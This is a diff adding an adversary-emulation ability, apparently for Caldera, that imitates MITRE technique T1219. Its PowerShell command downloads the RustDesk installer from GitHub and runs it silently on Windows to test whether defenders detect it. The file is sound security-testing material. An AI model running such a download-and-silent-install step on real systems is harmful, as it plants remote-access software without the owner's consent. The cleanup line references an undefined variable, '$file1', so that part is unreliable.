@@ -1,0 +1,22 @@
+---
+- id: daf88583455fa0cfa0f66e3728552d75
+  name: RustDesk Files Detected Test on Windows
+  description: "An adversary may attempt to trick the user into downloading RustDesk\
+    \ and use this to maintain access to the machine. \nDownload of RustDesk installer\
+    \ will be at the destination location when successfully executed.\n"
+  tactic: command-and-control
+  technique:
+    attack_id: T1219
+    name: Remote Access Software
+  platforms:
+    windows:
+      psh:
+        command: $file = Join-Path $env:USERPROFILE "Desktop\rustdesk-1.2.3-1-x86_64.exe";
+          Invoke-WebRequest  -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe;
+          Start-Process -FilePath $file "/S"
+        payloads: []
+        cleanup: $file = Join-Path $env:USERPROFILE "Desktop\rustdesk-1.2.3-1-x86_64.exe";
+          Remove-Item $file1 -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
